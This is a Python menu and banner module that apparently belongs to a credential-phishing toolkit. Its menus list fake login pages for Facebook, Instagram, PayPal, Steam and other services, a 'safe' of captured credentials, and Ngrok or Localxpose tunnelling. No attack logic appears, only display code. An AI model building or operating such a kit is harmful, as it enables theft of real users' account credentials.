#!/usr/bin/env python3
import time
from termcolor import colored
####PRINT#######################################################################
def showTitle():
    print(colored("""
    ███      ▄█   ▄█          ▄████████    ▄███████▄  ▄█     ▄████████
▀█████████▄ ███  ███         ███    ███   ███    ███ ███    ███    ███
   ▀███▀▀██ ███▌ ███         ███    ███   ███    ███ ███▌   ███    ███
    ███   ▀ ███▌ ███         ███    ███   ███    ███ ███▌   ███    ███
    ███     ███▌ ███       ▀███████████ ▀█████████▀  ███▌ ▀███████████
    ███     ███  ███         ███    ███   ███        ███    ███    ███""", "blue"), colored("""
    ███     ███  ███▌    ▄   ███    ███   ███        ███    ███    ███
   ▄████▀   █▀   █████▄▄██   ███    █▀   ▄████▀      █▀     ███    █▀
            ▀
""", "red"))
    print(colored("""                O  o
                    _\_   o
By helich0pper   \\\/  o\ .
                 //\___=
                    ''
          """, "cyan"))
def lod(msg, n):
    space = 50
    hash = 0

    for count in range(0, 101, 2):
        time.sleep((n/100))
        if count == 70 or count == 10 or count == 90:
            time.sleep((n/100) + 0.5)
        print(msg + ": " + str(count) + "%" + "[" + ("#"*hash), ("-"*space) + "]", end="\r")
        space -= 1
        hash += 1
    print("")
def showMain():
    showTitle()
    print("[1] Start phishing")
    print("[2] Show current session data")
    print("[3] My safe")
    print("[4] Change Ngrok authtoken")
    print("\n[0] Exit")
    print("Option: ", end="")
def showPhish():
    showTitle()
    print("[1] Adobe\t"+colored("[10] Netflix\t[19] Steam", "yellow"))
    print("[2] Badoo\t[11] Origin\t[20] Subitoit")
    print("[3] Devianart\t[12] Paypal\t[21] Cryptocurrency")
    print("[4] Ebay\t[13] Pinterest\t[22] Twitch")
    print("[5]",colored("Facebook", "red"),"\t[14] Twitter\t[23] Playstation (PSN)")
    print("[6] Github\t[15] Pornhub\t[24] Wordpress")
    print("[7]",colored("Instagram", "red"),"\t[16] Yahoo\t[25] Redit"+colored(" (beta)", "blue"))
    print("[8] Linkedin\t[17] Yandex\t[26] Shopify"+colored(" (beta)", "blue"))
    print("[9] Myspace\t[18] Spotify\t[27] " + colored("Custom", "red"))
    print("\n[0] back")
    print("Option: ", end="")
def showSafe():
    showTitle()
    print("Your safe is where all captured credentials are saved.")
    print("[1] Clear Safe")
    print("[2] Show safe")
    print("\n[0] back")
    print("Option: ", end="")
def showPhishMen():
    showTitle()
    print("Which forwarding service?")
    print("[1] Ngrok (allows more connections)")
    print("[2] Localxpose (allows custom subdomain name)")
    print("\n[0] back")
    print("Option: ", end="")
def showInsta():
    showTitle()
    print("Which Instagram theme?")
    print("[1] Normal Login Page (default)")
    print("[2] Instagram Survey")
    print("[3] Instagram Autoliker")
    print("[4] Instagram Verified Badge")
    print("[5] Instagram Followers")
    print("\nOption: ", end="")
def showFace():
    showTitle()
    print("Which Facebook theme?")
    print("[1] Normal Login Page (default)")
    print("[2] Facebook Survey")
    print("[3] Facebook Verify Login")
    print("\nOption: ", end="")









    #
